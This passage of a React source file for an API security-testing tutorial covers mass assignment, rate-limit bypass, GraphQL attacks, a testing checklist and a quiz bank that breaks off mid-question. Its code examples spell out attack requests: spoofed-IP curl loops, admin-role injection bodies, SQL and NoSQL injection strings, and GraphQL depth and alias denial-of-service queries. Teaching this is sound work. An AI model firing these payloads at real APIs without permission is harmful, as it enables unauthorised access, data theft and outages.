    codeExample: `# Check for excessive data in responses\nGET /api/users/me\n\n# Vulnerable response example:\n{\n  "id": 123,\n  "username": "john",\n  "email": "john@example.com",\n  "password_hash": "$2b$12$...",      // Shouldn't be here!\n  "api_key": "sk_live_...",            // Shouldn't be here!\n  "internal_notes": "VIP customer",   // Internal data\n  "ssn": "123-45-6789",               // PII exposure\n  "created_at": "2023-01-01",\n  "_internal_id": "usr_abc123",       // Internal reference\n  "permissions": ["read", "write"],   // May reveal roles\n  "login_attempts": 3,                 // Security info\n  "mfa_secret": "JBSWY3DPEHPK3PXP"   // MFA seed!\n}\n\n# Test for debug parameters\nGET /api/users/me?debug=true\nGET /api/users/me?verbose=1\nGET /api/users/me?_dev=1\n\n# Analyze with jq\ncurl -s https://api.target.com/users/me \\\n  -H "Authorization: Bearer $TOKEN" | jq 'keys'\n\n# Look for sensitive patterns\ncurl -s ... | jq -r '.. | strings' | grep -iE 'pass|token|key|secret|hash'`,
  },
  {
    title: "Mass Assignment",
    icon: <DataObjectIcon />,
    color: "#f59e0b",
    description: "Modifying object properties that should be read-only by including them in requests.",
    keyPoints: [
      "Add extra fields to update requests",
      "Try modifying: role, is_admin, permissions, balance",
      "Check for writeable fields in GET responses",
      "Test nested object property injection",
      "Look for fields in documentation marked read-only",
    ],
    techniques: [
      "Add admin fields: {\"name\": \"test\", \"role\": \"admin\"}",
      "Modify balance: {\"amount\": 100, \"balance\": 999999}",
      "Change ownership: {\"user_id\": 1, \"owner_id\": 2}",
      "Inject nested: {\"profile\": {\"verified\": true}}",
    ],
    codeExample: `# Mass Assignment attack
# Normal update request:
PUT /api/users/123
{"name": "John", "email": "john@example.com"}

# Attack - add privileged fields:
PUT /api/users/123
{
  "name": "John",
  "email": "john@example.com",
  "role": "admin",
  "is_verified": true,
  "account_balance": 99999,
  "permissions": ["read", "write", "delete", "admin"]
}`,
  },
  {
    title: "Information Disclosure",
    icon: <InfoIcon />,
    color: "#8b5cf6",
    description: "Extracting sensitive information from error messages, headers, and metadata.",
    keyPoints: [
      "Verbose error messages with stack traces",
      "Database error messages revealing schema",
      "Server version in headers",
      "Debug endpoints left enabled",
      "API documentation with internal details",
      "Timing-based information disclosure",
    ],
    techniques: [
      "Trigger errors with invalid input types",
      "Send malformed JSON/XML",
      "Request non-existent resources for error details",
      "Check /debug, /status, /health, /metrics endpoints",
      "Analyze timing differences for valid vs invalid data",
    ],
  },
];

// Tab 6: Rate Limiting & DoS
const rateLimitTopics: TopicSection[] = [
  {
    title: "Rate Limit Bypass Techniques",
    icon: <SpeedIcon />,
    color: "#ef4444",
    description: "Circumventing API rate limiting and throttling mechanisms through various evasion techniques.",
    keyPoints: [
      "IP rotation via proxies or X-Forwarded-For",
      "User-Agent rotation",
      "API key rotation (if multiple available)",
      "Endpoint variation: /api/users vs /api/Users",
      "HTTP method variation: GET vs POST",
      "Parameter pollution to create unique requests",
      "Unicode/encoding variations in paths",
      "Race condition exploitation",
      "HTTP/2 multiplexing for parallel requests",
    ],
    techniques: [
      "Add X-Forwarded-For: 127.0.0.1 header",
      "Try X-Real-IP, X-Originating-IP, X-Remote-IP, X-Client-IP",
      "URL case variation: /API/endpoint",
      "Add dummy parameters: ?_=timestamp",
      "Use HTTP/2 for parallel requests",
      "Try path variations: /api/users, /api//users, /api/./users",
    ],
    codeExample: `# Rate limit bypass techniques\n\n# 1. IP spoofing headers (try each one)\ncurl -H "X-Forwarded-For: 1.2.3.4" https://api.target.com/endpoint\ncurl -H "X-Real-IP: 5.6.7.8" https://api.target.com/endpoint\ncurl -H "X-Originating-IP: 9.10.11.12" https://api.target.com/endpoint\ncurl -H "X-Remote-IP: 13.14.15.16" https://api.target.com/endpoint\ncurl -H "X-Client-IP: 17.18.19.20" https://api.target.com/endpoint\ncurl -H "True-Client-IP: 21.22.23.24" https://api.target.com/endpoint\ncurl -H "X-Forwarded-Host: trusted.com" https://api.target.com/endpoint\n\n# 2. Endpoint case/path variations\n/api/v1/users\n/API/V1/USERS\n/api/v1/users/\n/api/v1//users\n/api/v1/./users\n/%61%70%69/v1/users  # URL encoded\n\n# 3. Parameter pollution bypass\n/api/users?id=1\n/api/users?id=1&_=12345\n/api/users?id=1&dummy=random\n\n# 4. HTTP/2 race condition (using h2load)\nh2load -n 100 -c 10 https://api.target.com/endpoint\n\n# 5. Rotate headers with each request\nfor ip in $(seq 1 255); do\n  curl -H "X-Forwarded-For: 192.168.1.$ip" https://api.target.com/endpoint\ndone\n\n# 6. Method switching\nGET  /api/action  # Rate limited\nPOST /api/action  # Might have separate limit\nHEAD /api/action  # Often not counted`,
    tips: [
      "Combine multiple bypass techniques",
      "Test during different time windows",
      "Check if authenticated requests have higher limits",
      "Look for rate limit reset headers to time attacks",
    ],
  },
  {
    title: "Resource Exhaustion",
    icon: <BlockIcon />,
    color: "#dc2626",
    description: "Testing for denial of service through resource-intensive operations.",
    keyPoints: [
      "Large payload uploads",
      "Deeply nested JSON structures",
      "Regex DoS (ReDoS) in search parameters",
      "Expensive database queries",
      "File processing without limits",
      "GraphQL query complexity attacks",
    ],
    techniques: [
      "Send very large JSON body (megabytes)",
      "Deep nesting: {\"a\":{\"a\":{\"a\":...}}}",
      "Long strings in search: ?search=aaaa...×10000",
      "Many concurrent connections",
      "Request very large result sets: ?limit=999999",
    ],
    tips: [
      "Document rate limits and thresholds",
      "Test during off-peak hours with permission",
      "Be careful not to impact production services",
    ],
  },
  {
    title: "Batch & Bulk Endpoint Abuse",
    icon: <DataObjectIcon />,
    color: "#f59e0b",
    description: "Exploiting batch operations for data enumeration and bypass.",
    keyPoints: [
      "Batch endpoints may bypass rate limits",
      "Mass data retrieval via batch queries",
      "Batch operations for IDOR at scale",
      "GraphQL batching for parallel attacks",
    ],
    techniques: [
      "POST /api/batch [{\"id\": 1}, {\"id\": 2}, ...]",
      "GraphQL: [{query1}, {query2}, ...] in single request",
      "Test batch size limits",
      "Enumerate data via batch IDOR",
    ],
    codeExample: `# Batch endpoint abuse
POST /api/batch
[
  {"method": "GET", "path": "/users/1"},
  {"method": "GET", "path": "/users/2"},
  {"method": "GET", "path": "/users/3"},
  // ... hundreds more
]

# GraphQL batching
POST /graphql
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]`,
  },
];

// Tab 7: GraphQL Specific
const graphqlTopics: TopicSection[] = [
  {
    title: "GraphQL Introspection & Reconnaissance",
    icon: <SchemaIcon />,
    color: "#e535ab",
    description: "Using GraphQL introspection to discover the entire API schema and identify attack surfaces.",
    keyPoints: [
      "Introspection reveals all types, queries, mutations",
      "Find hidden or deprecated fields",
      "Discover internal-only operations",
      "Build schema documentation from introspection",
      "Identify sensitive fields: password, token, secret",
      "Find admin-only mutations",
      "Discover file upload mutations",
    ],
    tools: ["GraphQL Voyager", "InQL (Burp)", "graphql-cop", "Altair GraphQL Client", "graphql-path-enum"],
    codeExample: `# Full introspection query\nquery IntrospectionQuery {\n  __schema {\n    queryType { name }\n    mutationType { name }\n    subscriptionType { name }\n    types {\n      name\n      kind\n      description\n      fields {\n        name\n        description\n        args { name type { name kind } }\n        type { name kind ofType { name kind } }\n      }\n    }\n    directives { name description }\n  }\n}\n\n# Simplified type discovery\nquery { __schema { types { name kind } } }\n\n# Field discovery for a specific type\nquery { __type(name: "User") {\n  fields { name type { name } }\n} }\n\n# Find mutations (often less protected)\nquery {\n  __schema {\n    mutationType {\n      fields { name args { name } }\n    }\n  }\n}\n\n# If introspection is disabled, try:\n# - Suggestions in error messages\n# - Field name brute force\n# - Check for /graphql/schema endpoint`,
    tips: [
      "If introspection is disabled, use field suggestion errors",
      "Look for deprecated fields - often still functional",
      "Check for __typename in responses for type info",
    ],
  },
  {
    title: "GraphQL Injection & Authorization Bypass",
    icon: <BugReportIcon />,
    color: "#ef4444",
    description: "SQL injection, IDOR, and authorization bypass in GraphQL endpoints through query manipulation.",
    keyPoints: [
      "Injection in query arguments",
      "IDOR through ID arguments",
      "Authorization bypass in nested queries",
      "Batched queries for enumeration",
      "Mutation parameter manipulation",
      "Fragment-based authorization bypass",
      "Subscription-based data leakage",
    ],
    techniques: [
      "Test ID fields: query { user(id: \"1\") { ... } }",
      "SQL injection: query { user(id: \"1' OR '1'='1\") { ... } }",
      "Access nested private data through relationships",
      "Batch enumeration: [{query: user(1)}, {query: user(2)}...]",
      "Use fragments to access restricted types",
    ],
    codeExample: `# IDOR in GraphQL - Direct object access\nquery {\n  user(id: "other-user-uuid") {\n    id email phone\n    creditCards { number cvv expiry }\n    addresses { street city }\n  }\n}\n\n# Authorization bypass via nested queries\n# Direct query might be blocked:\nquery { adminSettings { secretKey } }  # 403 Forbidden\n\n# But nested access might work:\nquery {\n  me {\n    organization {\n      adminSettings { secretKey }  # Might bypass checks!\n    }\n  }\n}\n\n# SQL Injection in arguments\nquery {\n  searchUsers(filter: "admin' OR '1'='1") {\n    id email\n  }\n}\n\n# NoSQL injection in GraphQL\nquery {\n  user(where: {email: {_ne: ""}}) {\n    id email password_hash\n  }\n}\n\n# Enum/ID brute force via batching\n[\n  {"query": "{ user(id: \\"1\\") { email } }"},\n  {"query": "{ user(id: \\"2\\") { email } }"},\n  {"query": "{ user(id: \\"3\\") { email } }"}\n  // ... enumerate thousands\n]\n\n# Fragment-based field access\nquery {\n  users {\n    ...AdminFields\n  }\n}\nfragment AdminFields on User {\n  id email\n  internal_notes  # May bypass field-level auth\n}`,
    tips: [
      "Nested queries often bypass authorization",
      "Check if mutations have different auth than queries",
      "Test subscriptions for real-time data leakage",
    ],
  },
  {
    title: "GraphQL DoS Attacks",
    icon: <SpeedIcon />,
    color: "#f59e0b",
    description: "Denial of service through query complexity and depth attacks.",
    keyPoints: [
      "Deeply nested queries",
      "Circular relationship exploitation",
      "Alias-based query multiplication",
      "Large batch queries",
      "Field duplication attacks",
    ],
    techniques: [
      "Nest queries to maximum depth",
      "Use aliases to repeat expensive operations",
      "Exploit circular references: user→posts→author→posts→...",
      "Request all fields on large collections",
    ],
    codeExample: `# Depth attack - deeply nested query
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends { email }
          }
        }
      }
    }
  }
}

# Alias attack - multiply operations
query {
  a1: user(id: 1) { expensive_field }
  a2: user(id: 1) { expensive_field }
  a3: user(id: 1) { expensive_field }
  # ... repeat 1000 times
}

# Circular reference abuse
query {
  user {
    posts {
      author {
        posts {
          author {
            posts { title }
          }
        }
      }
    }
  }
}`,
    tips: [
      "Check for query depth limits",
      "Test query complexity/cost analysis",
      "Look for timeout configurations",
    ],
  },
];

// Tab 8: Testing Checklist
const checklistItems = [
  {
    category: "Discovery & Recon",
    color: "#3b82f6",
    items: [
      "Enumerate all API endpoints",
      "Find API documentation (Swagger/OpenAPI)",
      "Identify API versions and test all",
      "Analyze JavaScript for hidden endpoints",
      "Check for GraphQL introspection",
      "Identify authentication mechanisms",
      "Map WebSocket connections",
      "Check mobile app traffic",
    ],
  },
  {
    category: "Authentication",
    color: "#8b5cf6",
    items: [
      "Test for default/weak credentials",
      "Test JWT algorithm confusion",
      "Test JWT secret brute force",
      "Check token expiration handling",
      "Test OAuth redirect_uri validation",
      "Verify logout invalidates tokens",
      "Test MFA bypass techniques",
      "Check for credential stuffing protection",
    ],
  },
  {
    category: "Authorization",
    color: "#ef4444",
    items: [
      "Test BOLA/IDOR on all endpoints",
      "Test horizontal privilege escalation",
      "Test vertical privilege escalation",
      "Check admin endpoint access",
      "Test multi-tenant isolation",
      "Verify role-based access controls",
      "Test method tampering (GET→DELETE)",
      "Check parameter pollution bypass",
    ],
  },
  {
    category: "Input Validation",
    color: "#f59e0b",
    items: [
      "Test SQL injection in all parameters",
      "Test NoSQL injection",
      "Test command injection",
      "Test SSRF via URL parameters",
      "Test for mass assignment",
      "Test XSS in API responses",
      "Test XXE via Content-Type switching",
      "Test SSTI in templates",
    ],
  },
  {
    category: "Data Security",
    color: "#10b981",
    items: [
      "Check for excessive data exposure",
      "Analyze error messages for info leak",
      "Test debug endpoints",
      "Check for sensitive data in logs",
      "Verify PII handling",
      "Test data export features",
      "Check response caching headers",
      "Test file upload/download security",
    ],
  },
  {
    category: "Rate Limiting & DoS",
    color: "#06b6d4",
    items: [
      "Test rate limiting implementation",
      "Attempt rate limit bypass",
      "Test resource exhaustion",
      "Check for GraphQL complexity limits",
      "Test batch endpoint abuse",
      "Verify timeout configurations",
      "Test large payload handling",
      "Check WebSocket message flooding",
    ],
  },
  {
    category: "Business Logic",
    color: "#ec4899",
    items: [
      "Test price/quantity manipulation",
      "Check for race conditions",
      "Test coupon/discount abuse",
      "Verify workflow step bypass",
      "Test negative value handling",
      "Check idempotency key reuse",
      "Test duplicate transaction handling",
      "Verify state machine transitions",
    ],
  },
  {
    category: "Configuration",
    color: "#a855f7",
    items: [
      "Check CORS configuration",
      "Verify HTTPS enforcement",
      "Test security headers",
      "Check for version disclosure",
      "Test HTTP method support",
      "Verify Content-Type handling",
      "Check for open redirects",
      "Test HSTS implementation",
    ],
  },
];

// Section Navigation Items for sidebar
const sectionNavItems = [
  { id: "intro", label: "Introduction", icon: <ApiIcon /> },
  { id: "overview", label: "OWASP API Top 10", icon: <SecurityIcon /> },
  { id: "discovery", label: "Discovery & Enumeration", icon: <SearchIcon /> },
  { id: "authentication", label: "Authentication Testing", icon: <VpnKeyIcon /> },
  { id: "authorization", label: "Authorization (BOLA/BFLA)", icon: <AdminPanelSettingsIcon /> },
  { id: "injection", label: "Injection Attacks", icon: <BugReportIcon /> },
  { id: "data-exposure", label: "Data Exposure", icon: <VisibilityIcon /> },
  { id: "rate-limits", label: "Rate Limits & DoS", icon: <SpeedIcon /> },
  { id: "graphql", label: "GraphQL Security", icon: <SchemaIcon /> },
  { id: "checklist", label: "Testing Checklist", icon: <CheckCircleIcon /> },
  { id: "tools", label: "Tools & Resources", icon: <BuildIcon /> },
  { id: "related", label: "Related Topics", icon: <AssignmentIcon /> },
  { id: "quiz", label: "Knowledge Check", icon: <SchoolIcon /> },
];

const ACCENT_COLOR = "#3b82f6";
const QUIZ_QUESTION_COUNT = 10;

const selectRandomQuestions = (questions: QuizQuestion[], count: number) =>
  [...questions].sort(() => Math.random() - 0.5).slice(0, count);

const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Discovery",
    question: "The primary goal of API discovery is to:",
    options: [
      "Map endpoints and attack surface",
      "Exploit vulnerabilities immediately",
      "Disable authentication",
      "Generate the final report",
    ],
    correctAnswer: 0,
    explanation: "Discovery identifies endpoints, versions, and technologies to guide testing.",
  },
  {
    id: 2,
    topic: "Discovery",
    question: "A common OpenAPI specification file is:",
    options: ["/openapi.json", "/robots.txt", "/manifest.json", "/favicon.ico"],
    correctAnswer: 0,
    explanation: "OpenAPI specs are often exposed at /openapi.json or similar paths.",
  },
  {
    id: 3,
    topic: "GraphQL",
    question: "GraphQL introspection typically starts with:",
    options: ["{ __schema {", "{ __types {", "{ query {", "{ introspect {"],
    correctAnswer: 0,
    explanation: "The __schema field is used to introspect GraphQL schemas.",
  },
  {
    id: 4,
    topic: "Authentication",
    question: "API keys in URLs are risky because:",
    options: ["They can leak in logs and referrers", "They are always hashed", "They enable MFA", "They rotate automatically"],
    correctAnswer: 0,
    explanation: "URLs are logged and shared, exposing keys.",
  },
  {
    id: 5,
    topic: "JWT",
    question: "Setting JWT alg to none can lead to:",
    options: ["Signature bypass", "Token encryption", "Token expiry", "CORS errors"],
    correctAnswer: 0,
    explanation: "alg=none can allow unsigned tokens if not validated.",
  },
  {
    id: 6,
    topic: "JWT",
    question: "RS256 to HS256 confusion can allow:",
    options: ["Signing with a public key", "Token expiration", "TLS downgrade", "CSRF"],
    correctAnswer: 0,
    explanation: "HS256 accepts a shared secret, which can be the public key if misused.",
  },
  {
    id: 7,
    topic: "OAuth",
    question: "The OAuth state parameter protects against:",
    options: ["CSRF", "SQL injection", "XSS", "Brute force"],
    correctAnswer: 0,
    explanation: "State binds the OAuth flow to a user session.",
  },
  {
    id: 8,
    topic: "OAuth",
    question: "PKCE primarily protects against:",
    options: ["Authorization code interception", "SSRF", "SQL injection", "XSS"],
    correctAnswer: 0,
    explanation: "PKCE prevents stolen auth codes from being redeemed.",
  },
  {
    id: 9,
    topic: "Authorization",
    question: "BOLA/IDOR occurs when:",
    options: ["Object access is not properly authorized", "Passwords are weak", "Tokens are short", "TLS is missing"],
    correctAnswer: 0,
    explanation: "BOLA allows access to other users' objects by changing IDs.",
  },
  {
    id: 10,
    topic: "Authorization",
    question: "BFLA is:",
    options: ["Accessing privileged functions without authorization", "Brute force login", "Missing HTTPS", "SQL injection"],
    correctAnswer: 0,
    explanation: "BFLA is broken function-level authorization.",
  },
  {
    id: 11,
    topic: "Authorization",
    question: "BOPLA refers to:",
    options: ["Unauthorized access to object properties", "Broken login flow", "Proxy configuration", "SSL errors"],
    correctAnswer: 0,
    explanation: "BOPLA is broken object property level authorization.",
  },
  {
    id: 12,
    topic: "Authorization",
    question: "Mass assignment vulnerabilities allow:",
    options: ["Setting unintended fields via APIs", "Faster queries", "Encrypted payloads", "Lower latency"],
    correctAnswer: 0,
    explanation: "Attackers can set properties not intended to be writable.",
  },
  {
    id: 13,
    topic: "Data Exposure",
    question: "Excessive data exposure means:",
    options: ["APIs return more fields than needed", "APIs have short responses", "Responses are cached", "TLS is used"],
    correctAnswer: 0,
    explanation: "Sensitive fields may be included in responses unnecessarily.",
  },
  {
    id: 14,
    topic: "Rate Limiting",
    question: "Rate limiting should be enforced:",
    options: ["Per user or token, not just IP", "Only for admins", "Only on GET", "Only in clients"],
    correctAnswer: 0,
    explanation: "Per-user limits reduce abuse from shared IPs.",
  },
  {
    id: 15,
    topic: "Resource Consumption",
    question: "Unrestricted resource consumption includes:",
    options: ["Large pagination or expensive queries", "Using HTTPS", "JSON responses", "TLS 1.3"],
    correctAnswer: 0,
    explanation: "Expensive queries can exhaust resources without limits.",
  },
  {
    id: 16,
    topic: "SSRF",
    question: "SSRF commonly targets:",
    options: ["Internal services and metadata endpoints", "User browsers", "Public CDNs", "DNS only"],
    correctAnswer: 0,
    explanation: "SSRF can reach internal hosts and metadata services.",
  },
  {
    id: 17,
    topic: "SSRF",
    question: "The AWS metadata IP is:",
    options: ["169.254.169.254", "127.0.0.1", "10.0.0.1", "8.8.8.8"],
    correctAnswer: 0,
    explanation: "Cloud metadata often lives at 169.254.169.254.",
  },
  {
    id: 18,
    topic: "CORS",
    question: "The CORS header that controls allowed origins is:",
    options: ["Access-Control-Allow-Origin", "Content-Security-Policy", "X-Frame-Options", "Strict-Transport-Security"],
    correctAnswer: 0,
    explanation: "Access-Control-Allow-Origin defines allowed origins.",
  },
  {
    id: 19,
    topic: "GraphQL",
    question: "GraphQL depth limits help prevent:",
    options: ["Resource exhaustion", "XSS", "CSRF", "SQL injection"],
    correctAnswer: 0,
    explanation: "Deep queries can be expensive without limits.",
  },
  {
    id: 20,
    topic: "GraphQL",
    question: "In production, GraphQL introspection should be:",
    options: ["Restricted or disabled", "Always enabled", "Exposed to all users", "Required for auth"],
    correctAnswer: 0,
    explanation: "Introspection can expose schema details.",
  },
  {
    id: 21,
    topic: "GraphQL",
    question: "Batching abuse can allow:",
    options: ["Bypassing rate limits", "Better caching", "Lower latency", "Stronger auth"],
    correctAnswer: 0,
    explanation: "Multiple operations in one request can evade limits.",
  },
  {
    id: 22,
    topic: "Injection",
    question: "The best defense against SQL injection is:",
    options: ["Parameterized queries", "Client-side validation", "String concatenation", "Hiding errors"],
    correctAnswer: 0,
    explanation: "Prepared statements prevent injection.",
  },
  {
    id: 23,
    topic: "Injection",
    question: "A common NoSQL injection operator is:",
    options: ["$ne", "UNION", "<script>", "../"],
    correctAnswer: 0,
    explanation: "Mongo operators like $ne can bypass filters.",
  },
  {
    id: 24,
    topic: "Injection",
    question: "Command injection often uses separators like:",
    options: ["; and &&", "? and &", "+ and -", "% and #"],
    correctAnswer: 0,
    explanation: "Shell separators chain commands.",
  },
  {
    id: 25,
    topic: "SSRF",
    question: "A common SSRF mitigation is:",
    options: ["Allowlist of hosts", "Blocking all HTTP", "Using GET only", "Disabling TLS"],
    correctAnswer: 0,
    explanation: "Allowlists restrict outbound destinations.",
  },
  {
    id: 26,
    topic: "Inventory",
    question: "Improper inventory management results in:",
    options: ["Undocumented or deprecated APIs exposed", "Strong authentication", "Automatic patching", "Fewer endpoints"],
    correctAnswer: 0,
    explanation: "Unknown endpoints are often unsecured.",
  },
  {
    id: 27,
    topic: "Supply Chain",
    question: "Unsafe consumption of APIs means:",
    options: ["Trusting upstream data without validation", "Always using HTTPS", "Enforcing MFA", "Using JSON"],
    correctAnswer: 0,
    explanation: "Upstream data should be validated and sanitized.",
  },
  {
    id: 28,
    topic: "Authentication",
    question: "JWT validation should always check:",
    options: ["Signature and expiration", "Only header", "Only payload", "Only issuer name"],
    correctAnswer: 0,
    explanation: "Signature and exp are critical for JWT security.",
  },
  {
    id: 29,
    topic: "Authentication",
    question: "Tokens should be revoked on:",
    options: ["Logout or password change", "Every request", "Page refresh", "DNS lookup"],
    correctAnswer: 0,
    explanation: "Revocation limits stolen token lifetimes.",
  },
  {
    id: 30,
    topic: "Authentication",
    question: "API keys should be:",
    options: ["Scoped and rotated", "Shared across apps", "Embedded in URLs", "Never revoked"],
    correctAnswer: 0,
    explanation: "Scope and rotation reduce key abuse.",
  },
  {
    id: 31,
    topic: "Logging",
    question: "Sensitive data in logs should be:",
    options: ["Masked or redacted", "Stored in plaintext", "Repeated in errors", "Printed to clients"],
    correctAnswer: 0,
    explanation: "Logs should avoid exposing secrets.",
  },
  {
    id: 32,
    topic: "Authentication",
    question: "HTTP 401 means:",
    options: ["Authentication required", "Forbidden", "Not found", "Server error"],
    correctAnswer: 0,
    explanation: "401 indicates missing or invalid authentication.",
  },
  {
    id: 33,
    topic: "Authorization",
    question: "HTTP 403 means:",
    options: ["Authenticated but forbidden", "Unauthenticated", "Bad request", "Not found"],
    correctAnswer: 0,
    explanation: "403 indicates the user lacks permission.",
  },
  {
    id: 34,
    topic: "Resource Consumption",
    question: "A common mitigation for scraping is:",
    options: ["Pagination limits", "Allow-all CORS", "Weak caching", "Removing auth"],
    correctAnswer: 0,
    explanation: "Pagination limits reduce data harvesting.",
  },
  {
    id: 35,
    topic: "Validation",
    question: "Schema validation helps:",
    options: ["Enforce types and required fields", "Encrypt data", "Speed up DNS", "Disable logging"],
    correctAnswer: 0,
    explanation: "Schema validation blocks unexpected input.",
  },
  {
    id: 36,
    topic: "Authorization",
    question: "Least privilege for API scopes means:",
    options: ["Grant only required permissions", "Grant admin to all", "No scopes at all", "Use shared keys"],
    correctAnswer: 0,
    explanation: "Scopes should match the minimum required access.",
  },
  {
    id: 37,
    topic: "Rate Limiting",
    question: "X-RateLimit-Remaining indicates:",
    options: ["Requests left in the window", "Total users", "Token expiry", "API version"],
    correctAnswer: 0,
    explanation: "It shows how many requests remain before limit is hit.",
  },
  {
    id: 38,
    topic: "Architecture",
    question: "An API gateway helps by:",
    options: ["Centralizing auth and rate limits", "Disabling TLS", "Removing logging", "Bypassing validation"],
    correctAnswer: 0,
    explanation: "Gateways standardize controls and monitoring.",
  },
  {
    id: 39,
    topic: "Replay",
    question: "Replay attacks are reduced by:",
    options: ["Nonces or idempotency keys", "Short URLs", "Large responses", "Disabling HTTPS"],
    correctAnswer: 0,
    explanation: "Unique tokens prevent request replays.",
  },
  {
    id: 40,
    topic: "Authentication",
    question: "Mutual TLS provides:",
    options: ["Client certificate authentication", "Faster DNS", "XSS protection", "SQLi protection"],
    correctAnswer: 0,
    explanation: "mTLS verifies both client and server identities.",
  },
  {
    id: 41,
    topic: "Transport",
    question: "HSTS enforces:",
    options: ["HTTPS-only access", "Token rotation", "CORS", "Session storage"],
    correctAnswer: 0,
    explanation: "HSTS tells browsers to always use HTTPS.",
  },
  {
    id: 42,
    topic: "Transport",
    question: "Recommended TLS minimum is:",
    options: ["TLS 1.2 or newer", "SSL 2.0", "SSL 3.0", "TLS 1.0"],
    correctAnswer: 0,
    explanation: "Older TLS/SSL versions are insecure.",
  },
  {
    id: 43,
    topic: "Errors",
    question: "Verbose error messages can expose:",
    options: ["Stack traces and internal details", "Stronger encryption", "Rate limits", "JWT expiry"],
    correctAnswer: 0,
    explanation: "Errors can leak sensitive implementation details.",
  },
  {
    id: 44,
    topic: "GraphQL",
    question: "Field-level authorization is required to:",
    options: ["Protect nested data access", "Enable CORS", "Disable introspection", "Fix TLS"],
    correctAnswer: 0,
    explanation: "GraphQL resolvers need auth checks at field level.",
  },
  {
    id: 45,
    topic: "Authorization",
    question: "A common BOLA test is to:",
    options: ["Change the object ID in a request", "Change User-Agent", "Disable TLS", "Remove headers"],
    correctAnswer: 0,
    explanation: "Swapping IDs reveals missing authorization checks.",
  },
  {
    id: 46,
    topic: "Authorization",
    question: "A common BFLA test is to:",
    options: ["Access admin endpoints as a normal user", "Rotate TLS keys", "Enable caching", "Use OPTIONS"],
    correctAnswer: 0,
    explanation: "BFLA often involves role-restricted functions.",
  },
  {
    id: 47,
    topic: "Rate Limiting",
    question: "A risky CORS setup is:",
    options: ["Reflecting any Origin with credentials", "Restricting to a single origin", "Disabling credentials", "Using preflight"],
    correctAnswer: 0,
    explanation: "Wildcard origins with credentials allow cross-site access.",
  },
  {
    id: 48,
    topic: "Detection",
    question: "Timing differences can indicate:",
    options: ["Blind injection or enumeration", "Stronger auth", "Better caching", "Lower latency"],
    correctAnswer: 0,
    explanation: "Response timing can reveal true/false conditions.",
  },
  {
    id: 49,
    topic: "Smuggling",
    question: "HTTP request smuggling relies on:",
    options: ["Parsing discrepancies between components", "Weak passwords", "Expired tokens", "Public buckets"],
    correctAnswer: 0,
    explanation: "Different parsers can desync requests.",
  },
  {
    id: 50,
    topic: "Smuggling",
    question: "A likely impact of request smuggling is:",
    options: ["Cache poisoning or auth bypass", "Better throughput", "Lower CPU usage", "Token refresh"],
    correctAnswer: 0,
    explanation: "Smuggling can poison caches or bypass auth.",
  },
  {
    id: 51,
    topic: "Authorization",
    question: "Broken access control often leads to:",
    options: ["Unauthorized data access", "Faster requests", "Better logging", "Lower costs"],
    correctAnswer: 0,
    explanation: "Missing checks expose data and functionality.",
  },
  {
    id: 52,
    topic: "Authentication",
    question: "Default credentials are dangerous because:",
    options: ["They are widely known and reused", "They are encrypted", "They rotate daily", "They require MFA"],
    correctAnswer: 0,
    explanation: "Default passwords are commonly guessed.",
  },
  {
    id: 53,
    topic: "Discovery",
    question: "A common directory brute force tool is:",
    options: ["ffuf", "tcpdump", "john", "aircrack-ng"],
    correctAnswer: 0,
    explanation: "ffuf is popular for content discovery.",
  },
  {
    id: 54,
    topic: "Discovery",
    question: "Subdomain enumeration tools include:",
    options: ["Amass or Subfinder", "Hashcat", "Wireshark", "Netcat"],
    correctAnswer: 0,
    explanation: "Amass and Subfinder enumerate subdomains.",
  },
  {
    id: 55,
    topic: "Authentication",
    question: "MFA fatigue attacks target:",
    options: ["Push notification prompts", "Password hashes", "TLS ciphers", "DNS records"],
    correctAnswer: 0,
    explanation: "Attackers spam push approvals.",
  },
  {
    id: 56,
    topic: "Tokens",
    question: "Tokens in URLs can leak via:",
    options: ["Referer headers and logs", "TLS handshakes", "DNS queries", "Cache keys"],
    correctAnswer: 0,
    explanation: "URLs are logged and sent as referrers.",
  },
  {
    id: 57,
    topic: "Sessions",
    question: "Good session management includes:",
    options: ["Idle and absolute timeouts", "No expiration", "Same session after logout", "URL tokens"],
    correctAnswer: 0,
    explanation: "Sessions should expire and be invalidated.",
  },
  {
    id: 58,
    topic: "Rate Limiting",
    question: "Best rate limiting is enforced:",
    options: ["Server-side", "Client-side only", "Only in docs", "Only on GET"],
    correctAnswer: 0,
    explanation: "Client-side limits can be bypassed.",
  },
  {
    id: 59,
    topic: "Authorization",
    question: "A common IDOR test is to:",
    options: ["Change an object ID in the request", "Change the User-Agent", "Clear cookies", "Switch HTTPS to HTTP"],
    correctAnswer: 0,
    explanation: "Swapping IDs reveals missing checks.",
  },
  {
    id: 60,
    topic: "Client Storage",
    question: "Storing JWTs in localStorage increases risk of:",
    options: ["XSS token theft", "SQL injection", "CSRF", "SSRF"],
    correctAnswer: 0,
    explanation: "XSS can read localStorage tokens.",
  },
  {
    id: 61,
    topic: "WAF",
    question: "Common WAF bypass techniques include:",
    options: ["Encoding and case variations", "Using HTTPS", "Shorter URLs", "Static content"],
    correctAnswer: 0,
    explanation: "Obfuscation can bypass naive filters.",
  },
  {
    id: 62,
    topic: "SSRF",
    question: "SSRF filters are often bypassed with:",
    options: ["DNS rebinding", "TLS 1.3", "Strong cookies", "CSP"],
    correctAnswer: 0,
    explanation: "DNS rebinding can evade IP-based checks.",
  },
  {
    id: 63,
    topic: "Injection",
    question: "Input validation should be:",
    options: ["Server-side and strict", "Client-side only", "Optional", "Disabled for APIs"],
    correctAnswer: 0,
    explanation: "Server-side validation is the authoritative control.",
  },
  {
    id: 64,
    topic: "Client",
    question: "Exposed API keys in client apps are risky because:",
    options: ["Anyone can reuse them", "They improve security", "They rotate automatically", "They require MFA"],
    correctAnswer: 0,
    explanation: "Client-side keys can be extracted and abused.",
  },
  {
    id: 65,
    topic: "CORS",
    question: "When using credentials, Access-Control-Allow-Origin should:",
    options: ["Be a specific origin", "Be *", "Be empty", "Match the Host header"],
    correctAnswer: 0,
    explanation: "Wildcard is invalid with credentials and unsafe.",
  },
  {
    id: 66,
    topic: "Business Logic",
    question: "A business logic flaw example is:",
    options: ["Manipulating price or quantity fields", "TLS downgrade", "SQLi", "Buffer overflow"],
    correctAnswer: 0,
    explanation: "Logic bugs abuse workflows and rules.",
  },
  {
    id: 67,
    topic: "Tokens",
